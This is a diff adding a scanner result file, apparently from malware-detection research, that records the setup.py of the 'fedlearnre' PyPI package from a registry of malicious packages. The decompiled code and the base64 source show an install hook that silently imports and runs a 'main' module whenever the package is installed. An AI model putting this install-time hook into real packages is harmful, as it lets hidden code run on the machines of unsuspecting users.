@@ -1,0 +1,19 @@
+statistics:
+  total_files: 1
+  skipped_files: 0.0
+  processed_objects: 1
+  malicious_objects: 0
+details:
+- path: .repo_cache/malicious_repos/pypi_malregistry/fedlearnre/912.6/fedlearnre-912.6/fedlearnre-912.6/setup.py
+  contents:
+  - name: CrazyInstallStrat.run
+    score: 0.0
+    code: |-
+      def run(self):
+              install.run(self)
+              from main import main
+              main()
+    tokens: TARGETED_FILE resume load_global install load_attr run load_fast self call pop_top load_const INTEGER load_const import_name main import_from main store_fast main pop_top push_null load_fast main call pop_top return_const None
+    hash: 5879cd167bbb695613e170149fb07328fdd9b901ff50483b6adf8c730ea42167
+sources:
+  .repo_cache/malicious_repos/pypi_malregistry/fedlearnre/912.6/fedlearnre-912.6/fedlearnre-912.6/setup.py: ZnJvbSBzZXR1cHRvb2xzIGltcG9ydCBzZXR1cCwgZmluZF9wYWNrYWdlcwpmcm9tIHNldHVwdG9vbHMuY29tbWFuZC5pbnN0YWxsIGltcG9ydCBpbnN0YWxsCgoKY2xhc3MgQ3JhenlJbnN0YWxsU3RyYXQoaW5zdGFsbCk6CiAgICBkZWYgcnVuKHNlbGYpOgogICAgICAgIGluc3RhbGwucnVuKHNlbGYpCiAgICAgICAgZnJvbSBtYWluIGltcG9ydCBtYWluCiAgICAgICAgbWFpbigpCgpzZXR1cCgKICAgIG5hbWU9ImZlZGxlYXJucmUiLAogICAgdmVyc2lvbj0iOTEyLjYiLAogICAgYXV0aG9yPSJ4IiwKICAgIGF1dGhvcl9lbWFpbD0ieHh4QG91dGxvb2suY29tIiwKICAgIGRlc2NyaXB0aW9uPSJ4IiwKICAgIGxvbmdfZGVzY3JpcHRpb25fY29udGVudF90eXBlPSJ0ZXh0L21hcmtkb3duIiwKICAgIGxvbmdfZGVzY3JpcHRpb249Inh4eCIsCiAgICBjbWRjbGFzcz17CiAgICAgICAgJ2luc3RhbGwnOiBDcmF6eUluc3RhbGxTdHJhdCwKICAgIH0sCiAgICBpbnN0YWxsX3JlcXVpcmVzPVsncmVxdWVzdHMnXSwKICAgIHNldHVwX3JlcXVpcmVzPVsnc2V0dXB0b29scyddCik=
